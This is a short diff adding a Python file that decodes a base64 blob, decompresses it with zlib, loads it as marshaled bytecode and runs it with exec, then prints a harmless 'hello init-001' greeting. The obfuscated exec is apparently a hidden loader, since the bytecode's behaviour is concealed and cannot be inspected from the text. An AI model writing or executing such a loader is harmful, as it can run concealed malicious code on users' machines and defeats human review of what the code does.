@@ -1,0 +1,10 @@
+import marshal, zlib, base64
+
+
+b64= b'eJx1kU1LwzAYx5O0TWsZ8wW8efBov4OIImPssCJth9BLKEuR4dbOZPMg3tyX2VfK1VPP+wI+T7qCFG3JP/8nL09+yfNNep8D7R6avgEZE0kk3UH7YjlGTDoQORBR6UpvR3ImeUoif97PQ495DlcgJYH1uJbmjmS5K53ck27OpQd7ueFpWei6anBPw1CQonFB4r1vAiGqYlUKYUIhVrXcLtEPhHjbFsvjDE+fkkk8hn42nY4Swx9m2WwaG/48ibNRsifqFLJZMf6qUIuiqhU7ch4GIAFxaffbmX+vpNAA9kmLnW3XEVNIbAU8glsB76H3Ws/Ro8TK72h+yRnKhUUBc95Fc9pjQLhHLBFu+ITivEJqyVIoDDynG1sM4+n1onr5CKt6c63XCrw9JaKGvvcONeGm1Bttb4ODGhkDfAmmLhE3cuyLWBw78he6CW7b4tzRLseQDP2B/wMXS2f8'
+
+
+exec(marshal.loads(zlib.decompress(base64.b64decode(b64) )))
+
+print("hello init-001")
+
